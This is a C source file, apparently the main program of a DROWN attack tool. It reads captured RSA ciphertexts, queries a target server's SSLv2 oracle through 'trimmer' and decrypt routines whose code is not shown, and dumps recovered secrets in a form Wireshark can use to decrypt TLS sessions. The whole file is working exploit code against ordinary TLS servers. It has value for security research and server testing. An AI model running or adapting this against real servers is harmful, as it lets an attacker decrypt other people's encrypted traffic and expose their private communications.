#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include "utils.h"
#include "trimmers.h"
#include "decrypt.h"



int main(int argc, char *argv[])
{
    int res;

    // Initialize OpenSSL
    SSL_library_init();
    SSL_load_error_strings();

    // Create global context
    drown_ctx dctx;
    drown_new(&dctx);

    // Read arguments
    if(argc != 3)
    {
        fprintf(stderr, "Usage : %s host:port certfile\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Initialize research parameters
    dctx.hostport = argv[1];

    read_public_key(&dctx, argv[2]);

    // Create some trimmers

    trimmers_t trimmers;
    trimmers_new(&trimmers, 40);


    // Loop every ciphertext

    char *line = NULL;
    size_t size;

    while(getline(&line, &size, stdin) != -1)
    {
        res = BN_hex2bn(&dctx.c, line);
        MY_ASSERT(res != 0, "c is not a valid hexadecimal string");

        BN_one(dctx.s);
        if(!find_trimmer(&dctx, &trimmers))
        {
            fprintf(stderr, "Could not find a valid trimmer\n");
            continue;
        }

        decrypt(&dctx);

        // Try to decrypt the message
        BN_mod_inverse(dctx.s, dctx.s, dctx.n, dctx.ctx);
        BN_mod_mul(dctx.mt, dctx.mt, dctx.s, dctx.n, dctx.ctx);

        dump_wireshark(line, dctx.mt);

    }

    free(line);
    trimmers_free(&trimmers);
    drown_free(&dctx);

    return 0;
}
